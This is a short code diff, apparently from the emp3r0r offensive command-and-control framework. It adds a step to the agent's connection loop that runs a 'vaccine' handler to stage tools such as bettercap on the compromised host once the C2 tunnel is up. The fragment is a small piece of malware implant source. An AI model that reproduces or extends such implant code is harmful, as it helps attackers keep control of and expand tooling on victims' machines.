@@ -311,6 +311,9 @@ connect:
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
+	if !util.IsFileExist(emp3r0r_data.UtilsPath + "/bettercap") {
+		go agent.VaccineHandler()
+	}
 	err = agent.CCMsgTun(ctx, cancel)
 	if err != nil {
 		log.Printf("CCMsgTun: %v, reconnecting...", err)
